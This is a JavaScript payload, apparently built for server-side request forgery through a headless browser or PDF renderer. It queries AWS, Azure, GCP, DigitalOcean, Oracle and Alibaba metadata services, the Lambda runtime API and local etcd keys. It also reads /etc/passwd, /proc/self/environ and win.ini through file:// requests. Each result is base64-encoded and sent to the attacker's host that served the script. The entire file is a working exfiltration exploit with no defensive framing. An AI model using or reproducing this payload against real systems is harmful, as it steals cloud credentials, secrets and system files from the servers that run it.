
function exfil(key, value) {
    fetch(document.currentScript.getAttribute('src') + '?' + key + '=' + value.substring(0, 800))
}

exfil('msg', 'successful_js_execution');

fetch('https://www.google.com')
    .then(r => r.text())
    .then(r => { exfil('google_test', btoa(r)) })
    .catch(e => { exfil('err', btoa(e)) });

fetch('http://169.254.169.254/latest/user-data')
    .then(r => r.text())
    .then(r => { exfil('user_data', btoa(r)) });

//aws ec2                                                                                                                                                                                                            
fetch('http://169.254.169.254/latest/api/token', { method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } })
    .then(r => r.text())
    .then(r => { exfil('ec2', btoa(r)) });

//aws ecs                                                                                                                                                                                                            
//http://169.254.170.2/v2/credentials/<GUID>
// $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

// aws lambda                                                                                                                                                                                                        
fetch('http://localhost:9001/2018-06-01/runtime/invocation/next')
    .then(r => r.text())
    .then(r => { exfil('lambda_event', btoa(r)) });

// aws elastic beanstalk
fetch('http://169.254.169.254/latest/dynamic/instance-identity/document')
    .then(r => r.text())
    .then(r => { exfil('elasticbeanstalk', btoa(r)) });

// azure metadata
fetch('http://169.254.169.254/metadata/instance?api-version=2021-12-13', { headers: { 'Metadata': 'true' } })
    .then(r => r.text())
    .then(r => { exfil('azure', btoa(r)) });

//gcp                                                                                                                                                                                                                
fetch('http://metadata/computeMetadata/v1/project/project-id', { headers: { 'Metadata-Flavor': 'Google' } })
    .then(r => r.text())
    .then(r => { exfil('gcp_projid', btoa(r)) });

fetch('http://metadata/computeMetadata/v1/oslogin/users', { headers: { 'Metadata-Flavor': 'Google' } })
    .then(r => r.text())
    .then(r => { exfil('gcp_users', btoa(r)) });

fetch('http://metadata/computeMetadata/v1/instance/description', { headers: { 'Metadata-Flavor': 'Google' } })
    .then(r => r.text())
    .then(r => { exfil('gcp_instance', btoa(r)) });

fetch('http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env', { headers: { 'Metadata-Flavor': 'Google' } })
    .then(r => r.text())
    .then(r => { exfil('gcp_k8', btoa(r)) });

// digital ocean
fetch('http://169.254.169.254/metadata/v1.json')
    .then(r => r.text())
    .then(r => { exfil('do', btoa(r)) });

fetch('http://169.254.169.254/metadata/v1/id')
    .then(r => r.text())
    .then(r => { exfil('do_id', btoa(r)) });

// oracle
fetch('http://169.254.169.254/opc/v1/instance/')
    .then(r => r.text())
    .then(r => { exfil('oracle', btoa(r)) });

// alibaba
fetch('http://100.100.100.200/latest/meta-data/instance-id')
    .then(r => r.text())
    .then(r => { exfil('alibaba', btoa(r)) });

// k8 etcd
fetch('http://127.0.0.1:2379/version')
    .then(r => r.text())
    .then(r => { exfil('k8', btoa(r)) });

fetch('http://127.0.0.1:2379/v2/keys/?recursive=true')
    .then(r => r.text())
    .then(r => { exfil('k8', btoa(r)) });

x = new XMLHttpRequest;
x.onload = function () { exfil('passwd', btoa(this.responseText)); }
x.open("GET", "file:///etc/passwd");
x.send();

x = new XMLHttpRequest;
x.onload = function () { exfil('environ', btoa(this.responseText)); }
x.open("GET", "file:///proc/self/environ");
x.send();

var x = new XMLHttpRequest;
x.onload = function () { exfil('win_ini', btoa(this.responseText)); }
x.open("GET", "file:///C:/WINNT/win.ini");
x.send();